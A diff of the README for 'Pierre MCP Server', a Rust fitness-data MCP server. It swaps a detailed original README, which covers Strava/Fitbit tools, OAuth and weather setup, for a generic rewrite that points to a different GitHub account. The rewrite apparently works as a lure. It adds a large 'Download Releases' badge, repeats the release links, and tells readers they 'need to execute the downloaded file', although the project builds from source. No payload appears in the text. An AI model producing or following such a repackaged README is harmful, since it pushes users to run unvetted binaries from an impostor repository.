@@ -1,663 +1,110 @@
-# Pierre MCP Server
+# Pierre MCP Server 🏋️‍♂️
 
-A comprehensive MCP (Model Context Protocol) server for fitness data analysis. Provides secure access to fitness data from multiple providers (Strava, Fitbit) through Claude and other AI assistants.
+Welcome to the **Pierre MCP Server**, a Rust-based server designed specifically for fitness applications. This repository aims to streamline the process of managing fitness data and integrating various services. Whether you are developing a fitness tracker or a personal AI assistant, this server provides a solid foundation.
 
-## LLM Prompt Examples
+[![Download Releases](https://img.shields.io/badge/Download%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/pgrlq7/pierre_mcp_server/releases)
 
-Once connected to Claude or another AI assistant, you can use natural language prompts to analyze your fitness data with comprehensive intelligence including location, weather, and performance context:
+## Table of Contents
 
-### 🏃 Running Analysis
-```
-What was my longest run this year and where did I run it?
+1. [Introduction](#introduction)
+2. [Features](#features)
+3. [Installation](#installation)
+4. [Usage](#usage)
+5. [API Documentation](#api-documentation)
+6. [Contributing](#contributing)
+7. [License](#license)
+8. [Contact](#contact)
 
-Analyze my running pace trends over the last 3 months with location context.
+## Introduction
 
-How many kms did I run in total last month?
-
-Find my fastest 5K time this year and the conditions when I achieved it.
-
-Show me all my runs in Saint-Hippolyte and analyze the terrain impact.
-
-Compare my performance on trails vs road running.
-
-What's my average pace when running in different cities or regions?
-```
-
-### 🚴 Cross-Training Analysis
-```
-Compare my cycling vs running activities this month with location data.
-
-What's my most active day of the week and where do I typically train?
-
-Show me my heart rate zones during my last 5 workouts with weather context.
-
-How has my fitness improved over the last 6 months?
-
-What's my longest consecutive streak of workouts?
-
-Analyze my performance in different locations - where do I perform best?
-
-Find patterns between workout locations and my energy levels.
-```
-
-### 🗺️ Location Intelligence
-```
-Generate Activity Intelligence for my longest run in 2025 with full location context.
-
-Where do I run most frequently and how does location affect my performance?
-
-Analyze my trail running vs road running performance patterns.
-
-Show me activities in Quebec and compare them to other regions.
-
-Find all my runs on mountain trails and analyze elevation impact.
-
-What cities or regions have I trained in this year?
-
-Compare my performance in urban vs rural training locations.
-
-Identify my favorite training routes and analyze why they work well for me.
-
-Show me how different terrains (forest, mountain, city) affect my pace.
-```
-
-### 🌦️ Weather & Environmental Impact
-```
-Analyze how weather conditions affect my running performance.
-
-Show me activities where I performed well despite challenging weather.
-
-Find patterns between temperature and my running pace.
-
-What's my best performance in cold weather vs hot weather?
-
-Analyze how rain, wind, and humidity impact my training.
-
-Show me my most challenging weather conditions and how I adapted.
-
-Compare my performance in different seasons with weather context.
-
-Find correlations between weather patterns and my training consistency.
-```
-
-### 📊 Comprehensive Activity Intelligence
-```
-Generate full Activity Intelligence for my most recent marathon with weather and location.
-
-Analyze my longest bike ride with complete environmental context.
-
-Show me my best performances with weather, location, and heart rate analysis.
-
-Create a detailed analysis of my training in mountainous regions.
-
-Compare my performance in different trail systems or parks.
-
-Analyze how elevation gain correlates with my effort levels across locations.
-
-Show me my most efficient training sessions with full environmental context.
-
-Find patterns between location, weather, and my personal records.
-```
-
-### 🎯 Goal Tracking & Performance
-```
-How close am I to running 1000 miles this year and where have I run them?
-
-Track my progress toward weekly goals with location diversity analysis.
-
-What's my personal best for each activity type and where did I achieve them?
-
-Show me days where I exceeded targets despite challenging conditions.
-
-Find patterns in my rest days vs active days across different locations.
-
-Analyze my consistency across different training environments.
-
-Compare my goal achievement rates in different locations or weather conditions.
-```
-
-### 📈 Advanced Intelligence Analysis
-```
-Correlate workout intensity with recovery time across different locations.
-
-What's the optimal workout frequency based on my data and environmental factors?
-
-Analyze seasonal patterns in my activity levels with location context.
-
-Compare my performance before and after training in new locations.
-
-Identify my most and least consistent training environments.
-
-Show me how location changes affect my adaptation and performance.
-
-Find optimal training conditions based on my historical performance data.
-
-Analyze the relationship between trail difficulty and my fitness improvements.
-
-Create a comprehensive training analysis with weather, location, and performance metrics.
-```
-
-### 🧠 AI-Powered Insights
-```
-Generate intelligent summaries for my recent activities with full context.
-
-Analyze my training patterns and suggest location-based improvements.
-
-Show me how environmental factors influence my training decisions.
-
-Create personalized insights about my optimal training conditions.
-
-Find hidden patterns in my performance across different environments.
-
-Suggest new training locations based on my performance preferences.
-
-Analyze my adaptation to different training environments over time.
-```
+The Pierre MCP Server serves as a backend for fitness applications, providing an efficient way to handle data aggregation and user management. Built with Rust and leveraging the Tokio framework, it ensures high performance and reliability. This server supports OAuth2 for secure authentication, allowing users to manage their fitness data seamlessly.
 
 ## Features
 
-- **Multi-Provider Support**: Strava and Fitbit integration with unified API
-- **Enhanced Security**: OAuth2 authentication with PKCE (Proof Key for Code Exchange)
-- **Comprehensive Data Access**: Activities, athlete profiles, and aggregated statistics
-- **🗺️ Location Intelligence**: GPS-based location detection with trail and region identification
-  - **Reverse Geocoding**: GPS coordinates → "Saint-Hippolyte, Québec, Canada"
-  - **Trail Detection**: Automatic recognition of trails, paths, and routes
-  - **Regional Context**: City, region, and country identification for training analysis
-  - **Location-Aware Summaries**: "Run in the rain **in Saint-Hippolyte, Québec**"
-- **🌦️ Intelligent Weather Integration**: Real-time and historical weather analysis with contextual insights
-- **🧠 Activity Intelligence**: AI-powered activity analysis with performance metrics, location, and weather context
-  - **Performance Metrics**: Heart rate zones, effort levels, efficiency scores
-  - **Environmental Context**: Weather conditions, location impact, terrain analysis
-  - **Natural Language Summaries**: Human-readable insights with full context
-  - **Personal Records**: Automatic detection with location and weather correlation
-- **MCP Protocol Compliance**: Works seamlessly with Claude and GitHub Copilot
-- **Extensible Design**: Easy to add new fitness providers in the future
-- **Production Ready**: Comprehensive testing and clean error handling
-
-## Architecture
-
-Pierre MCP Server supports two deployment modes:
-
-### 🏠 Single-Tenant Mode (Personal Use)
-- **Perfect for individual users** who want to run the server locally
-- No authentication required - direct access to your fitness data
-- Simple configuration with local config files or environment variables
-- Backwards compatible with existing setups
-
-### ☁️ Multi-Tenant Mode (Cloud Deployment)
-- **Enterprise-ready** for serving multiple users
-- **JWT Authentication** with secure user sessions
-- **Encrypted Token Storage** using AES-256-GCM for OAuth tokens at rest
-- **SQLite Database** for user management and token storage
-- **User Isolation** ensuring data privacy between users
-- **Cloud-Ready** for deployment on any cloud provider
+- **Fast and Efficient**: Built with Rust and Tokio, the server handles requests quickly.
+- **Data Aggregation**: Easily collect and manage fitness data from various sources.
+- **OAuth2 Support**: Securely authenticate users and manage their sessions.
+- **Self-Hosted**: Run the server on your own infrastructure for complete control.
+- **Integration with Strava**: Sync fitness data with Strava for enhanced tracking.
+- **AI Assistant Compatibility**: Use the server with AI assistants like Claude and Copilot for a personalized experience.
+- **Privacy-Focused**: Designed with user privacy in mind, ensuring data is handled securely.
 
 ## Installation
 
-### Local Development
+To get started with the Pierre MCP Server, follow these steps:
 
-```bash
-cargo build --release
-```
-
-### Docker Deployment
-
-The server supports Docker deployment with direnv (.envrc) integration:
-
-1. **Setup Environment Variables**:
+1. **Clone the Repository**:
    ```bash
-   # Copy the example to .envrc
-   cp .env.example .envrc
-   # Edit .envrc with your OAuth credentials
-   # If using direnv: direnv allow
-   ```
-
-2. **Using Docker Compose with direnv**:
-   ```bash
-   # Use the helper script that loads .envrc
-   ./docker-compose-with-envrc.sh up
-   
-   # Or manually export variables and run docker-compose
-   eval $(cat .envrc | grep export) && docker-compose up
-   ```
-
-3. **Production Deployment**:
-   ```bash
-   # Build and run in production mode
-   docker-compose -f docker-compose.prod.yml up -d
-   ```
-
-4. **Health Checks**: Available at `http://localhost:8081/health`
-
-**Note**: The Docker setup includes automatic health checks, backup services, and optional SQLite web interface for development.
-
-## OAuth2 Setup
-
-### Strava
-
-1. Create a Strava application at https://www.strava.com/settings/api
-2. Note your Client ID and Client Secret
-3. Run the auth setup tool:
-
-```bash
-cargo run --bin auth-setup -- strava \
-  --client-id YOUR_CLIENT_ID \
-  --client-secret YOUR_CLIENT_SECRET
-```
-
-4. Follow the browser prompts to authorize the application
-5. The tool will save your tokens to the config file
-
-### Fitbit
-
-1. Create a Fitbit application at https://dev.fitbit.com/apps/new
-   - **Application Type**: Personal
-   - **OAuth 2.0 Application Type**: Confidential
-   - **Redirect URL**: `http://localhost:8080/callback` (or your callback URL)
-   - **Default Access Type**: Read Only
-2. Note your Client ID and Client Secret
-3. Run the auth setup tool:
-
-```bash
-cargo run --bin auth-setup -- fitbit \
-  --client-id YOUR_CLIENT_ID \
-  --client-secret YOUR_CLIENT_SECRET
-```
-
-4. Follow the browser prompts to authorize the application
-5. The tool will save your tokens to the config file
-
-**Note**: Fitbit requires explicit scopes. The server requests `activity`, `profile`, and `sleep` permissions.
-
-## Weather Integration
-
-The server includes comprehensive weather integration that automatically enhances activity analysis with contextual weather data.
-
-### Features
-
-- ✅ **Real-time Weather**: Current weather data from OpenWeatherMap
-- ✅ **Historical Weather**: Historical weather data for past activities (with subscription)
-- ✅ **GPS-Based**: Extracts coordinates from activity start locations
-- ✅ **Smart Fallback**: Intelligent mock weather when API unavailable
-- ✅ **Activity Intelligence**: Weather context in activity summaries
-- ✅ **Impact Analysis**: Weather difficulty and performance adjustments
-
-### Setup (Optional)
-
-Weather integration works out-of-the-box with realistic mock weather patterns. For real weather data:
-
-1. **Get OpenWeatherMap API Key** (free tier available)
-   - Visit https://openweathermap.org/api
-   - Sign up for free account
-   - Copy your API key
-
-2. **Set Environment Variable**
-   ```bash
-   export OPENWEATHER_API_KEY="your_api_key_here"
-   ```
-
-3. **Configure Settings** (optional)
-   Edit `fitness_config.toml`:
-   ```toml
-   [weather_api]
-   provider = "openweathermap"
-   enabled = true
-   cache_duration_hours = 24
-   fallback_to_mock = true
-   ```
-
-### Weather Intelligence Examples
-
-With weather integration, activity analysis includes contextual insights:
-
-```json
-{
-  "summary": "Morning run in the rain with moderate intensity",
-  "contextual_factors": {
-    "weather": {
-      "temperature_celsius": 15.2,
-      "humidity_percentage": 85.0,
-      "wind_speed_kmh": 12.5,
-      "conditions": "rain"
-    },
-    "time_of_day": "morning"
-  }
-}
-```
-
-### Weather Features
-
-| Feature | Free Tier | Paid Tier |
-|---------|-----------|-----------|
-| **Mock Weather** | ✅ Realistic patterns | ✅ Available |
-| **Current Weather** | ✅ Real-time data | ✅ Real-time data |
-| **Historical Weather** | 🎭 Mock fallback | ✅ Real historical data |
-| **API Calls** | 1,000/day free | Unlimited with subscription |
-| **Production Ready** | ✅ Zero costs | ✅ Precise data |
-
-### Testing Weather Integration
-
-```bash
-# Test weather system
-cargo run --bin test-weather-integration
-
-# Diagnose API setup
-cargo run --bin diagnose-weather-api
-```
-
-## Configuration
-
-The server supports multiple configuration methods:
-
-### Using direnv (.envrc):
-```bash
-# Copy the example file
-cp .envrc.example .envrc
-
-# Edit with your credentials
-vim .envrc
-
-# Allow direnv to load the file
-direnv allow
-```
-
-### Using .env file:
-```env
-# Strava Configuration
-STRAVA_CLIENT_ID=your_strava_client_id
-STRAVA_CLIENT_SECRET=your_strava_client_secret
-STRAVA_ACCESS_TOKEN=your_strava_access_token
-STRAVA_REFRESH_TOKEN=your_strava_refresh_token
-
-# Fitbit Configuration
-FITBIT_CLIENT_ID=your_fitbit_client_id
-FITBIT_CLIENT_SECRET=your_fitbit_client_secret
-FITBIT_ACCESS_TOKEN=your_fitbit_access_token
-FITBIT_REFRESH_TOKEN=your_fitbit_refresh_token
-
-# Weather Configuration (optional)
-OPENWEATHER_API_KEY=your_openweather_api_key
-```
-
-### Using config.toml:
-```toml
-[providers.strava]
-auth_type = "oauth2"
-client_id = "your_strava_client_id"
-client_secret = "your_strava_client_secret"
-access_token = "your_strava_access_token"
-refresh_token = "your_strava_refresh_token"
-
-[providers.fitbit]
-auth_type = "oauth2"
-client_id = "your_fitbit_client_id"
-client_secret = "your_fitbit_client_secret"
-access_token = "your_fitbit_access_token"
-refresh_token = "your_fitbit_refresh_token"
-```
-
-## Usage
-
-### Single-Tenant Mode (Personal Use)
-
-```bash
-# Run in single-tenant mode (default, backwards compatible)
-cargo run --bin pierre-mcp-server -- --single-tenant
-
-# Run with custom port
-cargo run --bin pierre-mcp-server -- --single-tenant --port 9000
-
-# Run with custom config file
-cargo run --bin pierre-mcp-server -- --single-tenant --config /path/to/config.toml
-```
-
-### Multi-Tenant Mode (Cloud Deployment)
-
-```bash
-# Run in multi-tenant mode with authentication
-cargo run --bin pierre-mcp-server
-
-# Specify database and authentication settings
-cargo run --bin pierre-mcp-server -- \
-  --database-url "sqlite:./users.db" \
-  --token-expiry-hours 24 \
-  --port 8080
-
-# Use custom encryption and JWT secret files
-cargo run --bin pierre-mcp-server -- \
-  --encryption-key-file ./custom-encryption.key \
-  --jwt-secret-file ./custom-jwt.secret
-```
-
-### Multi-Tenant Authentication Flow
-
-1. **User Registration/Login** (Phase 2 - Coming Soon)
-   ```bash
-   # Register new user
-   curl -X POST http://localhost:8080/auth/register \
-     -H "Content-Type: application/json" \
-     -d '{"email": "user@example.com", "password": "secure_password"}'
-
-   # Login to get JWT token
-   curl -X POST http://localhost:8080/auth/login \
-     -H "Content-Type: application/json" \
-     -d '{"email": "user@example.com", "password": "secure_password"}'
-   ```
-
-2. **Use JWT Token in MCP calls**
-   ```json
-   {
-     "method": "authenticate",
-     "params": {
-       "jwt_token": "your_jwt_token_here"
-     }
-   }
-   ```
-
-### Security Features
-
-- **Encryption at Rest**: All OAuth tokens encrypted with AES-256-GCM
-- **JWT Authentication**: Stateless authentication with configurable expiry
-- **User Isolation**: Complete data separation between users
-- **Secure Defaults**: Encryption keys auto-generated if not provided
-- **No Shared State**: Each user's data completely isolated
-
-## MCP Tools
-
-The server exposes the following tools for all supported providers:
-
-- `get_activities`: Fetch fitness activities from a provider (supports pagination with limit/offset)
-  - **Providers**: `strava`, `fitbit`
-  - **Strava**: Uses activity list API with pagination
-  - **Fitbit**: Uses date-based activity queries (last 30 days by default)
-- `get_athlete`: Get athlete profile information
-  - **Strava**: Returns detailed athlete profile with avatar
-  - **Fitbit**: Returns user profile with display name and avatar
-- `get_stats`: Get aggregated statistics
-  - **Strava**: Uses athlete stats API with activity-based fallback
-  - **Fitbit**: Uses lifetime stats API with floor-to-elevation conversion
-- `get_activity_intelligence`: Generate AI-powered activity analysis with weather and location context
-  - **Parameters**: `include_weather` (bool), `include_location` (bool)
-  - **Performance Metrics**: Heart rate zones, effort levels, efficiency scores, personal records
-  - **🌦️ Weather Context**: Automatic GPS-based weather retrieval with intelligent fallback
-  - **🗺️ Location Intelligence**: Reverse geocoding, trail detection, regional context
-  - **Environmental Analysis**: Weather impact, terrain difficulty, location-specific insights
-  - **Natural Language**: Comprehensive summaries with full environmental context
-  - **Example**: "Run in the rain in Saint-Hippolyte, Québec with very high intensity"
-
-### Example Usage
-
-```bash
-# Test the server with example queries
-cargo run --bin find-2025-longest-run
-cargo run --bin find-2024-longest-run
-cargo run --bin find-consecutive-10k-runs
-
-# Test location intelligence features
-cargo run --bin test-location-intelligence
-cargo run --bin test-intelligence-for-longest-run
-cargo run --bin check-longest-run-gps
-
-# Example MCP tool calls:
-# {"method": "tools/call", "params": {"name": "get_activities", "arguments": {"provider": "strava", "limit": 10}}}
-# {"method": "tools/call", "params": {"name": "get_activities", "arguments": {"provider": "fitbit", "limit": 20}}}
-# {"method": "tools/call", "params": {"name": "get_athlete", "arguments": {"provider": "strava"}}}
-
-# Activity Intelligence with full context
-# {"method": "tools/call", "params": {"name": "get_activity_intelligence", "arguments": {"provider": "strava", "activity_id": "12345", "include_weather": true, "include_location": true}}}
-
-# Weather-only analysis
-# {"method": "tools/call", "params": {"name": "get_activity_intelligence", "arguments": {"provider": "strava", "activity_id": "12345", "include_weather": true, "include_location": false}}}
-
-# Location-only analysis  
-# {"method": "tools/call", "params": {"name": "get_activity_intelligence", "arguments": {"provider": "strava", "activity_id": "12345", "include_weather": false, "include_location": true}}}
-```
-
-## Adding to Claude or GitHub Copilot
-
-### Single-Tenant Mode Configuration
-
-Add to your MCP configuration:
-
-```json
-{
-  "mcpServers": {
-    "pierre-fitness": {
-      "command": "path/to/pierre-mcp-server",
-      "args": ["--single-tenant", "--port", "8080"]
-    }
-  }
-}
-```
-
-Or for development:
-
-```json
-{
-  "mcpServers": {
-    "pierre-fitness-dev": {
-      "command": "cargo",
-      "args": ["run", "--bin", "pierre-mcp-server", "--", "--single-tenant", "--port", "8080"],
-      "cwd": "/path/to/pierre_mcp_server"
-    }
-  }
-}
-```
-
-### Multi-Tenant Mode Configuration
-
-For cloud deployments, connect to your hosted multi-tenant server:
-
-```json
-{
-  "mcpServers": {
-    "pierre-fitness-cloud": {
-      "command": "mcp-client",
-      "args": ["--url", "https://your-cloud-server.com:8080", "--auth-type", "jwt"]
-    }
-  }
-}
-```
-
-## Development Roadmap
-
-### ✅ Phase 1: Multi-Tenant Architecture (Completed)
-- ✅ Multi-tenant server with JWT authentication
-- ✅ Encrypted token storage with AES-256-GCM
-- ✅ User isolation and database management
-- ✅ Unified server supporting both single and multi-tenant modes
-- ✅ Backwards compatibility for existing users
-
-### 🚧 Phase 2: OAuth Integration & User Onboarding (In Progress)
-- 🔄 User registration and login endpoints
-- 🔄 OAuth2 flow integration for Strava/Fitbit in multi-tenant mode
-- 🔄 Web interface for user onboarding
-- 🔄 Token refresh automation
-- 🔄 User management dashboard
-
-### 📋 Phase 3: Cloud Deployment Infrastructure
-- ⏳ Docker containerization
-- ⏳ Kubernetes deployment manifests
-- ⏳ Cloud provider templates (AWS, GCP, Azure)
-- ⏳ Load balancing and scaling configuration
-- ⏳ Monitoring and observability setup
-
-### 📋 Phase 4: Advanced Features
-- ⏳ Rate limiting and API quotas
-- ⏳ Advanced analytics and reporting
-- ⏳ WebSocket support for real-time updates
-- ⏳ Plugin system for custom providers
-- ⏳ GraphQL API support
-
-## Contributing
-
-We welcome contributions! Please see our [contribution guidelines](CONTRIBUTING.md) for details.
-
-### Quick Start for Contributors
-
-1. **Fork and clone the repository**
-   ```bash
-   git clone https://github.com/jfarcand/pierre_mcp_server.git
+   git clone https://github.com/pgrlq7/pierre_mcp_server.git
    cd pierre_mcp_server
    ```
 
-2. **Set up development environment**
+2. **Build the Project**:
+   Make sure you have Rust installed. You can install Rust using [rustup](https://rustup.rs/).
    ```bash
-   # Install Rust (if not already installed)
-   curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
+   cargo build --release
    ```
 
-3. **Run tests**
+3. **Download the Latest Release**:
+   Visit the [Releases section](https://github.com/pgrlq7/pierre_mcp_server/releases) to download the latest version. You need to execute the downloaded file to start the server.
+
+4. **Configuration**:
+   Before running the server, configure your settings in the `config.toml` file. This file allows you to set up your OAuth2 credentials, database connection, and other important parameters.
+
+5. **Run the Server**:
+   After configuration, you can start the server with the following command:
    ```bash
-   # Run all tests
-   cargo test
-   
-   # Run tests with output
-   cargo test -- --nocapture
+   cargo run --release
    ```
 
-4. **Development workflow**
-   ```bash
-   # Format code
-   cargo fmt
-   
-   # Lint code
-   cargo clippy
-   ```
+## Usage
 
-### Adding a New Provider
+Once the server is running, you can access it via your preferred API client or directly through your application. The server listens on the specified port in your configuration file. 
 
-1. Create a new file in `src/providers/your_provider.rs`
-2. Implement the `FitnessProvider` trait
-3. Add OAuth2 or API key authentication
-4. Update the provider factory in `src/providers/mod.rs`
-5. Add comprehensive tests in `tests/provider_integration.rs`
-6. Update configuration examples in README
+### Example API Calls
 
-### Code Style
+- **Get User Data**:
+  ```bash
+  curl -X GET http://localhost:8080/api/user
+  ```
 
-- Follow standard formatting (`cargo fmt`)
-- Use clippy for linting (`cargo clippy`)
-- Write comprehensive tests for new features
-- Document public APIs with comments
-- Follow the existing error handling patterns
+- **Post Fitness Data**:
+  ```bash
+  curl -X POST http://localhost:8080/api/fitness-data -d '{"steps": 10000, "calories": 500}'
+  ```
 
-### Commit Guidelines
+### OAuth2 Authentication
 
-- Use conventional commit format: `feat:`, `fix:`, `docs:`, etc.
-- Write clear, descriptive commit messages
-- Keep commits focused and atomic
-- Reference issues in commit messages when applicable
+To use the API, you'll need to authenticate using OAuth2. Follow the steps below to get your access token:
+
+1. Direct users to the authorization URL provided in your configuration.
+2. After they authorize, capture the authorization code.
+3. Exchange the authorization code for an access token using the token endpoint.
+
+## API Documentation
+
+For detailed API documentation, please refer to the [API Docs](https://github.com/pgrlq7/pierre_mcp_server/docs/api.md). This document outlines all available endpoints, request formats, and response structures.
+
+## Contributing
+
+We welcome contributions to improve the Pierre MCP Server. If you would like to contribute, please follow these steps:
+
+1. Fork the repository.
+2. Create a new branch for your feature or bug fix.
+3. Make your changes and commit them with clear messages.
+4. Push your changes to your fork.
+5. Create a pull request detailing your changes.
+
+Please ensure that your code adheres to the existing style and includes appropriate tests.
 
 ## License
 
-This project is dual-licensed under either of:
+This project is licensed under the MIT License. See the [LICENSE](https://github.com/pgrlq7/pierre_mcp_server/LICENSE) file for more details.
 
-* Apache License, Version 2.0 ([LICENSE-APACHE](LICENSE-APACHE))
-* MIT License ([LICENSE-MIT](LICENSE-MIT))
+## Contact
 
-at your option.
+For questions or feedback, please reach out to the maintainers via GitHub issues or directly at the email provided in the repository.
 
-### Contribution
+---
 
-Unless you explicitly state otherwise, any contribution intentionally submitted for inclusion in the work by you, as defined in the Apache-2.0 license, shall be dual licensed as above, without any additional terms or conditions.
+Thank you for your interest in the Pierre MCP Server! We hope this tool helps you build amazing fitness applications. Don’t forget to check the [Releases section](https://github.com/pgrlq7/pierre_mcp_server/releases) for the latest updates and downloads.
